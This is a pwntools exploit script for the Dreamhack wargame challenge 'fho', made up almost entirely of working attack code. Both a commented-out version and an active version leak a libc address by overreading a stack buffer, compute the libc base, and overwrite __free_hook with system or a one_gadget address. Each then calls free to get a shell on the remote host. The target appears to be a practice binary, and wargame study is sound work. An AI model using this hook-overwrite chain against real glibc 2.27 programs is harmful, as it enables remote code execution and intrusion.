from pwn import *

p = remote("host3.dreamhack.games", 22392)
e = ELF("./fho")
libc = ELF("./libc-2.27.so")


# # [1] Leak libc base
# buf = b"A" * 0x48
# p.sendafter(b"Buf: ", buf)
# p.recvuntil(buf)
# libc_start_main_xx = u64(p.recvline()[:-1] + b"\x00" * 2)
# print(p64(libc_start_main_xx))
# libc_base = libc_start_main_xx - (libc.symbols["__libc_start_main"] + 231)

# system = libc_base + libc.symbols["system"]
# free_hook = libc_base + libc.symbols["__free_hook"]
# binsh = libc_base + next(libc.search(b"/bin/sh"))

# # [2] Overwrite `free_hook` with `system`
# p.recvuntil(b"To write: ")
# p.sendline(str(free_hook).encode())
# p.recvuntil(b"With: ")
# p.sendline(str(system).encode())

# # [3] Exploit
# p.recvuntil(b"To free: ")
# p.sendline(str(binsh).encode())

# p.interactive()

# [1] Leak libc base
buf = b"A" * 0x48
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
libc_start_main_xx = u64(p.recvline()[:-1] + b"\x00" * 2)
libc_base = libc_start_main_xx - (libc.symbols["__libc_start_main"] + 231)
# 또는 libc_base = libc_start_main_xx - libc.libc_start_main_return
free_hook = libc_base + libc.symbols["__free_hook"]
og = libc_base + 0x4F432

# [2] Overwrite `free_hook` with `system`
p.recvuntil("To write: ")
p.sendline(str(free_hook).encode())
p.recvuntil("With: ")
p.sendline(str(og).encode())

# [3] Exploit
p.recvuntil("To free: ")
p.sendline(str(0x31337).encode())

p.interactive()
